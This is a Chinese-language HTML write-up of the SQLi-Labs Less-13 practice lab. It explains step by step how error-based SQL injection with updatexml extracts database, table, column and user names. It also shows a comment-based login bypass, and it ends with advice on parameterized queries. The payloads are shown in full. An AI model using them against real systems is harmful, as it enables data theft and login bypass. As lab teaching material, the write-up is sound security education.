@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Writeup: SQLi-Labs Less-13 - Y11516</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=Orbitron:wght@700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0a0e17; background-image: radial-gradient(circle at 50% 20%, rgba(0, 240, 255, 0.05) 0%, transparent 50%); font-family: 'Inter', sans-serif; color: #ccd6f6; padding: 6rem 1rem 4rem 1rem; display: flex; justify-content: center; line-height: 1.8; }
+        .navbar { position: fixed; top: 0; left: 0; width: 100%; padding: 1.2rem 5%; display: flex; justify-content: space-between; align-items: center; background: rgba(10, 14, 23, 0.7); backdrop-filter: blur(12px); border-bottom: 1px solid rgba(0, 240, 255, 0.15); z-index: 999; }
+        .logo { font-family: 'Orbitron', sans-serif; font-weight: 900; font-size: 1.2rem; color: #00f0ff; letter-spacing: 2px; }
+        .nav-links a { color: #8892b0; text-decoration: none; margin-left: 2rem; font-size: 0.9rem; transition: 0.3s; }
+        .nav-links a:hover { color: #00f0ff; }
+        .post-container { max-width: 820px; width: 100%; background: rgba(255,255,255,0.03); backdrop-filter: blur(6px); border: 1px solid rgba(255,255,255,0.06); border-radius: 32px; padding: 3rem; box-shadow: 0 30px 80px rgba(0, 0, 0, 0.6); }
+        h1 { font-family: 'Orbitron', sans-serif; font-size: 2.2rem; margin-bottom: 0.5rem; color: #00f0ff; text-shadow: 0 0 15px rgba(0, 240, 255, 0.3); }
+        .date { color: #475569; font-size: 0.9rem; margin-bottom: 2rem; padding-bottom: 1rem; border-bottom: 1px solid rgba(0, 240, 255, 0.2); display: flex; gap: 15px; flex-wrap: wrap;}
+        .date span { background: rgba(0, 240, 255, 0.1); padding: 0.2rem 0.8rem; border-radius: 12px; color: #00f0ff; font-size: 0.8rem; }
+        h2 { color: #a855f7; font-size: 1.4rem; margin: 2.5rem 0 1rem 0; border-left: 4px solid #a855f7; padding-left: 10px; }
+        h3 { color: #e2e8f0; font-size: 1.15rem; margin: 1.8rem 0 0.8rem 0; }
+        h4 { color: #c084fc; font-size: 1rem; margin: 1.2rem 0 0.6rem 0; }
+        p { margin-bottom: 1rem; color: #94a3b8; }
+        strong { color: #e2e8f0; }
+        code { background: rgba(0, 240, 255, 0.1); padding: 0.2rem 0.4rem; border-radius: 4px; font-family: 'Courier New', monospace; color: #00f0ff; font-size: 0.95rem; }
+        pre { background: #0f172a; padding: 1rem; border-radius: 8px; overflow-x: auto; border: 1px solid #1e293b; margin-bottom: 1rem; }
+        pre code { background: transparent; padding: 0; color: #e2e8f0; }
+        ul, ol { padding-left: 1.5rem; margin-bottom: 1rem; color: #94a3b8; }
+        li { margin-bottom: 0.5rem; }
+        .highlight-box { background: rgba(168, 85, 247, 0.05); border: 1px solid rgba(168, 85, 247, 0.2); border-radius: 12px; padding: 1.5rem; margin-bottom: 1rem; }
+        .note-box { background: rgba(0, 240, 255, 0.05); border-left: 3px solid #00f0ff; padding: 1rem; margin-bottom: 1rem; border-radius: 0 8px 8px 0; }
+        .action-bar { display: flex; justify-content: center; gap: 1.5rem; margin-top: 3rem; flex-wrap: wrap; }
+        .action-link { color: #00f0ff; text-decoration: none; border: 1px solid #00f0ff; padding: 10px 24px; border-radius: 30px; transition: 0.3s; }
+        .action-link:hover { background: rgba(0, 240, 255, 0.1); }
+        .action-link.secondary { color: #8892b0; border-color: #475569; }
+        @media (max-width: 640px) { .post-container { padding: 1.5rem; } h1 { font-size: 1.5rem; } .action-bar { flex-direction: column; } }
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <div class="logo"><i class="fas fa-shield-halved"></i> Y11516</div>
+        <div class="nav-links">
+            <a href="/ctf.html"><i class="fas fa-bug"></i> CTF 总库</a>
+            <a href="/"><i class="fas fa-house"></i> 主页</a>
+        </div>
+    </nav>
+
+    <div class="post-container">
+        <h1><i class="fas fa-database"></i> SQLi-Labs Less-13</h1>
+        <div class="date">
+            <span><i class="far fa-calendar-alt"></i> 2026年9月26日</span>
+            <span><i class="fas fa-tag"></i> SQLi-Labs</span>
+            <span><i class="fas fa-tag"></i> Web安全</span>
+            <span><i class="fas fa-tag"></i> SQL注入</span>
+            <span><i class="fas fa-tag"></i> POST双注入</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>SQLi-Labs Less-13 (POST - Double Injection - Single quotes- String - with twist)</li>
+            <li><strong>题目平台：</strong>SQLi-Labs 本地靶场</li>
+            <li><strong>题目类型：</strong>Web安全 / SQL注入 / POST型报错注入 / 单引号加括号闭合</li>
+            <li><strong>靶场链接：</strong>http://localhost:8081/Less-13/（本地环境）</li>
+            <li><strong>涉及工具：</strong>Chrome浏览器 (F12开发者工具)</li>
+        </ul>
+
+        <h2>二、解题步骤</h2>
+        
+        <h3>1. 分析题目考什么</h3>
+        <p>本题的核心考点是<strong>基于单引号加括号闭合的 POST 型报错注入（Double Injection）</strong>。Less-11 是单引号，Less-12 是双引号加括号，而 Less-13 则是单引号加括号 <code>')</code>。并且由于页面会直接回显 SQL 报错信息，我们依然可以使用 <code>updatexml()</code> 函数进行报错注入，从而快速获取数据库信息并最终登录。</p>
+
+        <h3>2. 怎么想（破题思路）</h3>
+        <ul>
+            <li>尝试 <code>admin')</code>，页面报错，确认单引号加括号闭合。</li>
+            <li>利用报错函数 <code>updatexml</code> 爆出数据库名 <code>security</code>。</li>
+            <li>查阅 <code>information_schema.tables</code> 和 <code>columns</code>，获取表名 <code>users</code> 和字段名。</li>
+            <li>爆出用户名 <code>Dumb</code>，利用靶场默认弱口令特性，直接使用 <code>Dumb/Dumb</code> 登录。</li>
+        </ul>
+
+        <h3>3. 怎么解（详细步骤与踩坑记录）</h3>
+        
+        <div class="note-box">
+            <h4><i class="fas fa-exclamation-triangle"></i> 踩坑记录一：获取表名时出现字符集冲突</h4>
+            <p><strong>踩坑情况：</strong>输入 <code>admin') and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x7e),1)#</code> 时，页面报错 <code>Illegal mix of collations...</code>。</p>
+            <p><strong>原因分析：</strong>系统数据库 <code>information_schema</code> 是 GBK 字符集，而靶场是 latin1，直接比较会冲突。</p>
+            <p><strong>改进方式：</strong>用十六进制表示字符串，把 <code>'users'</code> 写成 <code>0x7573657273</code>，或者使用 <code>database()</code> 替代 <code>'security'</code>。</p>
+        </div>
+
+        <div class="note-box">
+            <h4><i class="fas fa-exclamation-triangle"></i> 踩坑记录二：无法直接查密码（回显截断）</h4>
+            <p><strong>踩坑情况：</strong>尝试查密码时，页面报错只有 <code>XPATH syntax error: '~'</code>，无法回显密码内容。</p>
+            <p><strong>原因分析：</strong><code>updatexml</code> 报错回显最长只有 32 个字符，而密码的 MD5 通常是 32 位，加上前后的 <code>~</code> 符号会超长被截断。</p>
+            <p><strong>改进方式：</strong>使用 <code>substr()</code> 分段获取（如前30位+后2位拼接）。或者像本次通关一样，先爆出用户名 <code>Dumb</code>，由于靶场密码就是明文 <code>Dumb</code>，直接成功登录即可。无需死磕密码脱库。</p>
+        </div>
+
+        <div class="highlight-box">
+            <h4><i class="fas fa-terminal"></i> 详细实操步骤（Payload逐字解释）</h4>
+            
+            <p><strong>第一步：探测闭合方式</strong></p>
+            <p>Username 输入 <code>admin')</code>，Password 随便填。报错提示 <code>near '') and password=('123') LIMIT 0,1'</code>，说明闭合方式为 <code>')</code>。</p>
+
+            <p><strong>第二步：获取数据库名</strong></p>
+            <pre><code>admin') and updatexml(1,concat(0x7e,(select database()),0x7e),1)#</code></pre>
+            <p><strong>逐字解析：</strong></p>
+            <ul>
+                <li><code>admin')</code>：闭合原SQL中的 <code>username=('</code>。</li>
+                <li><code>updatexml(1, XPath格式字符串, 1)</code>：利用其解析错误抛出第二个参数的字符串。这是报错注入的核心。</li>
+                <li><code>concat(0x7e, (select database()), 0x7e)</code>：拼接波浪号 <code>~</code> 作为边界，中间放入查询库名的子查询。</li>
+                <li><code>#</code>：注释掉后续的密码验证及 LIMIT 限制。</li>
+            </ul>
+            <p>回显：<code>XPATH syntax error: '~security~'</code></p>
+
+            <p><strong>第三步：获取表名与列名</strong></p>
+            <p>查表名（用十六进制避开字符集冲突）：</p>
+            <pre><code>admin') and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() and table_name=0x7573657273 limit 0,1),0x7e),1)#</code></pre>
+            <p>回显 <code>~users~</code>。接着查列名（把 tables 换成 columns）：</p>
+            <pre><code>admin') and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=0x7573657273 limit 0,1),0x7e),1)#</code></pre>
+            <p>修改 limit 依次得到 <code>~id~</code>、<code>~username~</code>、<code>~password~</code>。</p>
+
+            <p><strong>第四步：爆出用户名并登录</strong></p>
+            <pre><code>admin') and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)#</code></pre>
+            <p>成功拿到 <code>~Dumb~</code>。最后回到登录框，Username 填 <code>Dumb</code>，Password 填 <code>Dumb</code>，成功登录（也可使用万能密码 <code>admin')#</code> 直接登录）。</p>
+        </div>
+
+        <h3>4. 怎么迁移（跨领域联想）</h3>
+        <ul>
+            <li><strong>代码审计与安全开发：</strong>冗余的括号 <code>('$username')</code> 是开发人员为了代码风格统一或习惯性操作引入的。在代码审计中，这种非标准写法往往可能带来额外的注入风险。安全开发必须坚持使用 PDO 或 MySQLi 参数化查询。</li>
+            <li><strong>逻辑漏洞挖掘：</strong>本次通关利用了“用户名密码相同”的弱口令逻辑。在真实渗透测试中，弱口令（如 admin/admin, test/test）是获取权限的最常见突破口，与 SQL 注入属于不同维度的攻击面。</li>
+        </ul>
+
+        <h2>三、名词大全与原理深度复盘</h2>
+        
+        <div class="highlight-box">
+            <h4>1. Double Injection（双注入）</h4>
+            <p>官方标签里的 Double Injection 有时指联合注入、报错注入，或在 SQLi-Labs 中指代包含子查询的注入。在此关中，我们通过 <code>updatexml</code> 报错回显，本质上是基于报错的注入。</p>
+
+            <h4>2. updatexml() 回显原理</h4>
+            <p><code>updatexml(XML_document, XPath_string, new_value)</code> 的第二个参数必须符合 XPath 语法。当传入 <code>~security~</code> 时，解析失败，MySQL 抛出 <code>XPATH syntax error</code> 并将错误内容显示在页面上。回显长度上限 32 字节。</p>
+
+            <h4>3. 万能密码原理</h4>
+            <p>利用 <code>#</code> 或 <code>-- </code> 注释符，把原 SQL 中密码校验的部分注释掉，使得后端只验证用户名。只要用户名存在，<code>SELECT</code> 就能查到结果，绕过密码验证。</p>
+        </div>
+
+        <h2>四、题目思考</h2>
+        
+        <h3>1. 这跟前面的题有什么区别？</h3>
+        <ul>
+            <li><strong>与 Less-11 的区别：</strong>闭合方式从 <code>'</code> 变成了 <code>')</code>。</li>
+            <li><strong>与 Less-12 的区别：</strong>Less-12 是 <code>")</code>，Less-13 是 <code>')</code>。Less-11/12 是 Error Based，Less-13 官方标记为 Double Injection，但在实际操作中两者都依赖报错回显。</li>
+        </ul>
+
+        <h3>2. 这种题目的出现原因（为什么存在）</h3>
+        <p>随着开发框架的演进，开发者有时会使用括号来明确 SQL 运算优先级，却忽略了他们仍然在使用字符串拼接的方式构建 SQL。这就导致了各种变形闭合方式的出现。</p>
+
+        <h3>3. 这种应用在实际中如何体现？</h3>
+        <p>在实际攻防中，遇到不报错的场景（盲注），时间成本极高。一旦发现页面抛出报错，渗透测试人员会首选报错注入（如 updatexml、extractvalue、floor 等），这也是为什么生产环境必须关闭 `display_errors` 并统一处理异常。</p>
+
+        <h3>4. 如何抽象理解概念（大白话）</h3>
+        <div class="highlight-box">
+            <p><strong>把数据库比作“带警报器的保险箱”：</strong></p>
+            <ul>
+                <li>Less-13 的锁孔变成了 <code>')</code> 形状。塞对了钥匙，保险箱不仅会打开，还会因为识别到异常而“报警”（报错回显），把里面的秘密直接喊出来。这就是报错注入的直观理解。</li>
+            </ul>
+        </div>
+
+        <p style="margin-top: 2rem; text-align: center; color: #475569;"><i class="fas fa-code"></i> 做一道题，就要往自己脑子里装点东西。</p>
+
+        <div class="action-bar">
+            <a href="/ctf.html" class="action-link"><i class="fas fa-arrow-left"></i> 返回 CTF 总库</a>
+            <a href="/" class="action-link secondary"><i class="fas fa-house"></i> 返回主页</a>
+        </div>
+    </div>
+</body>
+</html>
